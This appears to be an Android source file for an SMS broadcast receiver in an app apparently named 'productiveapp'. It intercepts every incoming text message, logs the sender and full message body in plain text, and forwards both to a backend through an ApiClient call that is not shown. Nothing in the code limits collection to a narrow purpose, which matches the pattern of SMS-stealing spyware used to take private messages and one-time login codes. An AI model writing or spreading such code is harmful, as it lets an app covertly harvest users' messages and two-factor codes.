package com.example.productiveapp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

public class SmsReceiver extends BroadcastReceiver {

    private static final String TAG = "SmsReceiver";
    public static final String SMS_BUNDLE = "pdus";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() != null && intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get(SMS_BUNDLE);
                if (pdus == null) return;

                final SmsMessage[] messages = new SmsMessage[pdus.length];
                for (int i = 0; i < pdus.length; i++) {
                    messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                }

                if (messages.length > 0) {
                    String sender = messages[0].getOriginatingAddress();
                    String messageBody = "";
                    for (SmsMessage message : messages) {
                        messageBody += message.getMessageBody();
                    }

                    Log.d(TAG, "Incoming SMS: From=" + sender + ", Body=" + messageBody);

                    // TODO: Send this data to your backend
                    ApiClient.sendSmsData(context, sender, messageBody);
                }
            }
        }
    }
}